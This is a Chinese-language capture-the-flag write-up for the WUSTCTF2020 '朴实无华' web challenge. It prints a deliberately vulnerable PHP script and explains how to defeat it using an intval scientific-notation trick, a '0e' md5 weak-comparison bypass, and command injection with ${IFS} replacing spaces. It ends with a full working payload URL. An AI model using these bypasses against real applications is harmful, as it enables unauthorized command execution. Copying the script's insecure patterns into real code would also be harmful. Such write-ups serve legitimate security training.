# \[WUSTCTF2020]朴实无华

## \[WUSTCTF2020]朴实无华

## 考点

* robots.txt泄露
* intval绕过
* PHP使用0e开头的数字md5值仍以0e开头绕过md5限制
* 命令执行`${IFS}`或者`$IFS$9`绕过空格

## wp

robots.txt发现存在/fAke\_f1agggg.php，访问在返回头给了提示，fl4g.php

![](<../../.gitbook/assets/image (26) (1) (1).png>)

访问后给了代码

```php
<?php
header('Content-type:text/html;charset=utf-8');
error_reporting(0);
highlight_file(__file__);

//level 1
if (isset($_GET['num'])){
    $num = $_GET['num'];
    if(intval($num) < 2020 && intval($num + 1) > 2021){
        echo "我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.</br>";
    }else{
        die("金钱解决不了穷人的本质问题");
    }
}else{
    die("去非洲吧");
}
//level 2
if (isset($_GET['md5'])){
   $md5=$_GET['md5'];
   if ($md5==md5($md5))
       echo "想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.</br>";
   else
       die("我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲");
}else{
    die("去非洲吧");
}

//get flag
if (isset($_GET['get_flag'])){
    $get_flag = $_GET['get_flag'];
    if(!strstr($get_flag," ")){
        $get_flag = str_ireplace("cat", "wctf2020", $get_flag);
        echo "想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.</br>";
        system($get_flag);
    }else{
        die("快到非洲了");
    }
}else{
    die("去非洲吧");
}
?> 
```

level 1要绕过intval函数，该函数用于获取变量的整数值，例如10e5就会获取10，4.5获取4，1e10就会获取1410065408，使用<mark style="color:orange;">`num=3e10`</mark>绕过

level 2要绕md5，利用PHP弱类型绕过，使用`0e215962017`绕过，`0e215962017`的md5值为`0e291242476940776845150308577824`

level 3要绕命令执行，过滤空格和cat，使用`$IFS$9`或者`${IFS}` 代替空格，`cat`可以换成`more`，`tac`

payload：`?num=3e10&md5=0e215962017&get_flag=tac${IFS}*`
